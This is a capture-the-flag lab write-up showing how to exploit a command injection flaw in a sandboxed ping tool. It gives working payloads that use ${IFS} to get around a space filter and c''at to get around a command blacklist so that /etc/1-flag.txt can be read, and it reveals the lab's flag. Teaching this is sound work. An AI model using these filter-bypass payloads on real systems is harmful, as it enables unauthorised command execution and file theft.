# Task 1. Inject fun, reveal hidden secrets!

## **Task Description**

### Time to beat our ping tool's defenses! Let's inject some fun and uncover secrets!


Welcome back to the next phase of your journey through the world of Command Injection vulnerabilities, set against the backdrop of our enhanced Asset Discovery tool.

Your mission now is to test the improved security measures and exploit the command injection vulnerability in the ping functionality.

### Challenge

We're building our Asset Discovery tool and integrating some new features. We've added a security layer, and we think it's more secure now. Can you test it and ensure it's safe?

This challenge focuses on Command Injection. The ping input is still vulnerable, but with some added security measures.

Initial Endpoint:

`http://web0x09.hbtn/app2`

Useful instructions:

1. Log into Asset Discovery tool.
2. ping is vulnerable.
3. We can try and give it an input (google.com for example).
4. To exploit this vulnerability, we need to use Bypass space, Bypass command check.
5. Flag Location is `/etc/1-flag.txt`

Repo:

GitHub repository: dlh-cyber_security \
Directory: web_application_security/0x09_command_injection \
File: 1-flag.txt



## **Solution**



- Start sandbox `cyber_websec_0x09`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.129.101 web0x09.hbtn" | sudo tee -a /etc/hosts
sudo vim /etc/hosts
ping -c 2 web0x09.hbtn
```

## **Task 1: Bypassing command injection filters**

**Target:** `http://web0x09.hbtn/app2`\
**Flag location:** `/etc/1-flag.txt`

The challenge introduces two defenses:

1. Space filtering.
2. Command filtering (blacklisted commands).

We'll identify which restrictions apply before attempting to bypass them.

### **Step 1: Test command injection without spaces**

Log into the application, navigate to **Ping**, and submit:

```
127.0.0.1;id
```

**Why this payload?**

- `127.0.0.1` is our legitimate ping target.
- `;` separates shell commands.
- `id` verifies whether arbitrary commands can execute.
- No spaces are present, which helps isolate the space-filtering behavior.

If successful, we'll see the current system user's UID and GID.

**Output:**

```
Asset Discovery Tool

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.025 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
uid=998(lab02) gid=998(lab02) groups=998(lab02)
```

**Step 1 successful. Command injection confirmed.**

The `id` command executed as `lab02` (UID 998). The semicolon separator works, even without spaces.

### **Step 2: Bypass space and command filters**

Enter the following payload:

```
127.0.0.1;c''at${IFS}/etc/1-flag.txt
```

### **How it works**

| Payload component | Purpose                                                        |
| ----------------- | -------------------------------------------------------------- |
| `127.0.0.1`       | Valid ping target                                              |
| `;`               | Shell command separator                                        |
| `c''at`           | Obfuscates `cat` to bypass a simple command blacklist          |
| `${IFS}`          | Expands to shell whitespace, bypassing literal-space filtering |
| `/etc/1-flag.txt` | Target flag file                                               |

**Key insight:** The shell concatenates `c''at` into `cat` during parsing, while `${IFS}` supplies the whitespace needed to separate the command from its argument.

This tests whether the security layer relies on matching literal command names and spaces rather than safely handling shell arguments.

**Output:**

```

Asset Discovery Tool

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.023 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.023/0.023/0.023/0.000 ms
FLAG_1 c0a5d514c99149b36881552b24c024fb
```

&#x20;Task 1 completed

Successfully bypassed both security filters and retrieved the flag.

### **Flag obtained**

**FLAG_1**

`c0a5d514c99149b36881552b24c024fb`

### **Technical summary**

| Property              | Result               |
| --------------------- | -------------------- |
| Vulnerability         | OS Command Injection |
| Target                | `/app2`              |
| Execution context     | `lab02` (UID 998)    |
| Space bypass          | `${IFS}`             |
| Command filter bypass | `c''at`              |
| Flag path             | `/etc/1-flag.txt`    |
| Outcome               | Successful           |

**Successful payload:**

```
127.0.0.1;c''at${IFS}/etc/1-flag.txt
```

### **Why the bypass worked**

The application accepted shell syntax that transformed the injected input during execution.

- `${IFS}` expanded to whitespace, bypassing the literal-space restriction.
- `c''at` was interpreted by the shell as `cat`, bypassing the command-name filter.

This demonstrates why blacklisting shell characters or command strings is insufficient to prevent command injection.



## Save the flag

```bash
echo "c0a5d514c99149b36881552b24c024fb" > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```
